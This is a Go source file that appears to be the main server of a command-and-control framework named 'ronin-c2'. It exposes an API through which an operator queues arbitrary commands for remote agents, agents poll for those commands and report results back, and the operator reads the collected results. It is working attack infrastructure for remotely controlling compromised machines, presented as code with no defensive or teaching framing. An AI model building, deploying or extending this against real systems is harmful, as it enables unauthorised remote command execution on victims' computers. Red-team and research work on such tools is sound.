package main

import (
	"encoding/json"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/google/uuid"
	"github.com/zerotrace0x/ronin-c2/internal/manager"
	"github.com/zerotrace0x/ronin-c2/internal/middleware"
	"github.com/zerotrace0x/ronin-c2/internal/types"
)

var mgr = manager.NewAgentManager(100)

func main() {
	api := http.NewServeMux()
	api.Handle("/command", middleware.APIKeyAuth(http.HandlerFunc(queueCommand)))
	api.Handle("/pull",    middleware.APIKeyAuth(http.HandlerFunc(agentPull)))
	api.Handle("/result",  middleware.APIKeyAuth(http.HandlerFunc(agentResult)))
	api.Handle("/results", middleware.APIKeyAuth(http.HandlerFunc(listResults)))
	addr := "127.0.0.1:7777"
	log.Printf("RONIN-C2 API listening on %s", addr)
	log.Fatal(http.ListenAndServe(addr, cors(api)))
}

func cors(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		if r.Method == http.MethodOptions {
			w.Header().Set("Access-Control-Allow-Headers", "Authorization, Content-Type, X-Agent-ID")
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func queueCommand(w http.ResponseWriter, r *http.Request) {
	var in struct { AgentID string `json:"agent_id"`; Command string `json:"command"` }
	if err := json.NewDecoder(r.Body).Decode(&in); err != nil || in.AgentID == "" || in.Command == "" {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	cmd := types.Command{ ID: uuid.NewString(), AgentID: in.AgentID, Command: in.Command, QueuedAt: time.Now().UTC() }
	mgr.Enqueue(in.AgentID, cmd)
	writeJSON(w, cmd)
}

func agentPull(w http.ResponseWriter, r *http.Request) {
	agentID := r.Header.Get("X-Agent-ID")
	if agentID == "" { http.Error(w, "missing X-Agent-ID", http.StatusBadRequest); return }
	cmd, ok := mgr.Dequeue(agentID)
	if !ok { w.WriteHeader(http.StatusNoContent); return }
	writeJSON(w, cmd)
}

func agentResult(w http.ResponseWriter, r *http.Request) {
	var res types.Result
	if err := json.NewDecoder(r.Body).Decode(&res); err != nil || res.AgentID == "" || res.CommandID == "" {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	res.ID = uuid.NewString(); res.EndedAt = time.Now().UTC()
	mgr.AppendResult(res.AgentID, res)
	writeJSON(w, map[string]string{"status":"ok","id":res.ID})
}

func listResults(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent_id")
	if agentID == "" { http.Error(w, "missing agent_id", http.StatusBadRequest); return }
	writeJSON(w, mgr.Results(agentID, 0))
}

func writeJSON(w http.ResponseWriter, v any) { w.Header().Set("Content-Type", "application/json"); _ = json.NewEncoder(w).Encode(v) }

func init() { if os.Getenv("RONIN_C2_API_KEY") == "" { log.Println("[WARN] RONIN_C2_API_KEY is empty; set it for auth to work") } }
